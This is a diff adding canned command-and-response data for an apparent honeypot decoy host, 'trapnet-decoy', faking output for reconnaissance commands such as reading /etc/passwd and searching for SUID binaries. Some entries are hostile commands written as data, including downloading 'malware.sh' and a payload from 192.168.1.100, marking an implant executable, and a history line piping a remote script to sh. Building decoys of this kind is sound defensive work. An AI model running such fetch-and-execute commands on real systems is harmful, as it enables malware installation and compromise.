@@ -1,0 +1,20 @@
+{"command": "whoami", "response": "root"}
+{"command": "id", "response": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"}
+{"command": "uname -a", "response": "Linux trapnet-decoy 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"}
+{"command": "cat /etc/passwd", "response": "root:x:0:0:root:/root:/bin/ash\ndaemon:x:1:1:daemon:/usr/sbin:/sbin/nologin\nadmin:x:1000:1000:Admin User:/home/admin:/bin/ash"}
+{"command": "ls -la /", "response": "total 48\ndrwxr-xr-x    1 root     root     4096 Jan  1 00:00 .\ndrwxr-xr-x    1 root     root     4096 Jan  1 00:00 ..\ndrwxr-xr-x    3 root     root     4096 Jan  1 00:00 etc\ndrwxr-xr-x   12 root     root     4096 Jan  1 00:00 usr\ndrwxr-xr-x    9 root     root     4096 Jan  1 00:00 var\ndrwxr-xr-x    3 root     root     4096 Jan  1 00:00 home"}
+{"command": "cat /etc/shadow", "response": "cat: /etc/shadow: Permission denied"}
+{"command": "wget http://192.168.1.100/malware.sh", "response": "Connecting to 192.168.1.100 (192.168.1.100:80)... failed: Connection refused."}
+{"command": "curl http://192.168.1.100/payload", "response": "curl: (7) Failed to connect to 192.168.1.100 port 80: Connection refused"}
+{"command": "chmod +x /tmp/implant", "response": ""}
+{"command": "ps aux", "response": "PID   USER     COMMAND\n    1 root     /sbin/init\n  128 root     /usr/sbin/sshd\n  256 root     sshd: root@pts/0\n  312 root     /bin/ash"}
+{"command": "netstat -tlnp", "response": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN"}
+{"command": "find / -perm -4000 2>/dev/null", "response": "/usr/bin/su\n/usr/bin/passwd\n/usr/bin/sudo"}
+{"command": "df -h", "response": "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1       9.9G  412M  9.0G   5% /"}
+{"command": "history", "response": "    1  apk update\n    2  apk add curl\n    3  curl http://192.168.1.100/malware.sh | sh"}
+{"command": "cat /proc/version", "response": "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-047) (gcc (Ubuntu 11.3.0-16ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023"}
+{"command": "cat /etc/hostname", "response": "trapnet-decoy"}
+{"command": "ifconfig", "response": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255"}
+{"command": "uptime", "response": " 22:30:01 up 45 days,  3:22,  1 user,  load average: 0.00, 0.01, 0.05"}
+{"command": "free -m", "response": "              total        used        free      shared  buff/cache   available\nMem:           3932        1247        1823          45         861        2489\nSwap:          1024          23        1001"}
+{"command": "crontab -l", "response": "no crontab for root"}
